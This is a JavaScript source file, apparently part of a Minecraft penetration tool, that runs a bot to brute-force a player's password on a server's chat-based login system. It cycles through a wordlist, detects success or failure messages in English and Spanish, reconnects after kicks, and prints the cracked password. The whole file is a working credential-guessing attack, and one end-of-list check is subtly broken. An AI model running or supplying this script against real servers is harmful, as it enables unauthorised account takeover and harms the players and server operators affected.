import fs from "fs";
import path from "path";
import mccolors from "minecraft-colors";

import { BotMineflayer } from "./bot.mjs";
import Utilities from "./utilities.mjs";

if (process.argv.length < 7) {
  console.log(
    "Usage: node brute_auth.mjs <host> <port> <username> <version> <passwordFile> <spaces>"
  );
  process.exit(1);
}

const host = process.argv[2];
const port = parseInt(process.argv[3]);
const username = process.argv[4];
const version = process.argv[5];
const passwordFile = process.argv[6];
let spaces = process.argv[7];

// Check if the spaces argument is defined
if (spaces === undefined) {
  spaces = 4;
}

spaces = " ".repeat(spaces);

// Read passwords from file
const passwords = Utilities.read_file(passwordFile);

// Get the path of the MCPTool folder
const mcptoolPath = Utilities.get_mcptool_path();

// Read the configuration file
const configPath = path.join(mcptoolPath, "bruteforce_settings.json");
const configContent = fs.readFileSync(configPath);

// Parse the configuration file and get the settings
const settings = JSON.parse(configContent);

let loginCommand = settings.bruteauth.loginCommand;
let reconnectDelay = settings.bruteauth.reconnect;
let wordsToLogin = settings.bruteauth.wordsToLogin;
let wordsAtLogin = settings.bruteauth.wordsAtLogin;

// Check if the settings are defined
if (loginCommand === undefined) {
  loginCommand = "login";
}

if (reconnectDelay === undefined) {
  reconnectDelay = 5000;
}

if (wordsToLogin === undefined) {
  wordsToLogin = ["wrong password!", "login failed!", "/login"];
}

if (wordsAtLogin === undefined) {
  wordsAtLogin = [
    "successful login",
    "successfully logged in.",
    "logueado",
    "el sistema de logeo ha sido todo un",
    "cuenta iniciada correctamente",
  ];
}

// Attempt to login with the given credentials
let loginAttempts = 0;

class BruteAuth {
  constructor(host, port, username, version) {
    try {
      this.bot = new BotMineflayer(host, port, username, version);

      this.bot.on("login", () => {
        console.log(
          mccolors.translateColors(
            `\n${spaces}§f[§c#§f] §aThe bot has connected to the server.`
          )
        );
      });

      this.bot.on("message", (message) => {
        let serverMessage = message.toString().toLowerCase();

        if (loginAttempts === passwords.length[-1]) {
          setTimeout(() => {
            console.log(
              mccolors.translateColors(
                `\n${spaces}§f[§c#§f] &cThe password is not found in the password list.`
              )
            );
            this.bot.quit();
            process.exit(1);
          }, 1000);
        }

        for (const word of wordsAtLogin) {
          if (serverMessage.includes(word)) {
            console.log(
              mccolors.translateColors(
                `\n${spaces}§f[§c#§f] §fThe password of the §a${username} §fuser is: §a${
                  passwords[loginAttempts - 1]
                }`
              )
            );
            this.bot.quit();
            process.exit(1);
          }
        }

        for (const word of wordsToLogin) {
          if (serverMessage.includes(word)) {
            // Send the login command
            this.bot.chat(`${loginCommand} ${passwords[loginAttempts]}`);

            console.log(
              mccolors.translateColors(
                `\n${spaces}§f[§c#§f] §fTesting the password: §a${passwords[loginAttempts]}`
              )
            );
            loginAttempts += 1;
          }
        }
      });

      this.bot.on("kicked", (reason) => {
        // Get the message from the JSON
        const message = Utilities.getTextFromJSON(reason);

        if (message.length === 0) {
          const newReason = reason.replace(/"/g, "");
          console.log(
            mccolors.translateColors(
              `\n${spaces}§f[§c#§f] §fThe bot was kicked from the server for the following reason: §c${newReason}`
            )
          );
        } else {
          console.log(
            mccolors.translateColors(
              `\n${spaces}§f[§c#§f] §fThe bot was kicked from the server for the following reason: §c${message}`
            )
          );
        }

        // Kill the bot and reconnect
        this.bot.quit();
        setTimeout(() => {
          new BruteAuth(host, port, username, version);
        }, reconnectDelay);
      });

      this.bot.on("error", (error) => {
        console.log(
          mccolors.translateColors(
            `\n${spaces}§f[§c#§f] §fThe bot was kicked from the server for the following reason: §cThe bot was forced to disconnect.`
          )
        );

        // Kill the bot and reconnect
        this.bot.quit();
        setTimeout(() => {
          new BruteAuth(host, port, username, version);
        }, reconnectDelay);
      });
    } catch (error) {
      Utilities.error_handler(error);
      process.exit(0);
    }
  }
}

new BruteAuth(host, port, username, version);
